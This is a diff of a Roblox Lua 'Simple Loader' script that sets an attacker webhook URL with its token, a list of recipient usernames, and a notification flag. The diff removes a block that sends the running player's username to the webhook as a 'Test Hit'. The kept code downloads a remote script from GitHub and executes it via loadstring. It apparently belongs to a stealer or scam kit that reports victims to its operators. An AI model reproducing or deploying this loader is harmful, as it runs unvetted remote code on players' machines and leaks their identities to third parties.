@@ -1,4 +1,4 @@
--- Test Loader with Direct Notification
+-- Simple Loader
 
 _G.POOR_WEBHOOK = "https://hooks.hyra.io/api/webhooks/1494345282455077055/1fHPDJmkKw3RMjcdJ9vI2vgK-L50LoDMECcqwHUE"
 
@@ -6,18 +6,6 @@ _G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "username"}
 
 _G.PING_POOR = true
 
--- Simple test message sent directly to Discord
-task.spawn(function()
-    if _G.POOR_WEBHOOK and game.Players.LocalPlayer then
-        local http = game:GetService("HttpService")
-        local data = {
-            content = "@everyone **Test Hit**\nUsername: " .. game.Players.LocalPlayer.Name .. "\nExecutor: Delta\nTime: " .. os.date("%X")
-        }
-        game:HttpPost(_G.POOR_WEBHOOK, http:JSONEncode(data))
-    end
-end)
-
--- Load the original Baddies script anyway
 task.spawn(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ks2006babyy-dev/Baddies/refs/heads/main/freemium.lua", true))()
 end)
